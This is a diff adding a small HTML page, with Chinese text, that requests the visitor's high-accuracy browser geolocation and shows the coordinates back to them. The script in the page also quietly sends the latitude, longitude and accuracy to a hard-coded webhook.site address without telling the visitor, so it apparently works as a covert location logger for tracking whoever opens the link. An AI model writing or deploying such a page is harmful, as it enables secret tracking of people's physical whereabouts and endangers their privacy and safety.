@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>正在取得位置...</h2>
+
+<script>
+
+var webhook = "https://webhook.site/89e9774f-affe-4c04-9e2e-4708314ca8ad";
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook + "?lat=" + lat + "&lon=" + lon + "&acc=" + acc);
+
+document.body.innerHTML =
+"定位成功<br>" +
+"緯度: "+lat+"<br>" +
+"經度: "+lon+"<br>" +
+"精準度: "+acc+"公尺";
+
+},{
+enableHighAccuracy:true
+});
+
+}
+
+</script>
+
+</body>
+</html>
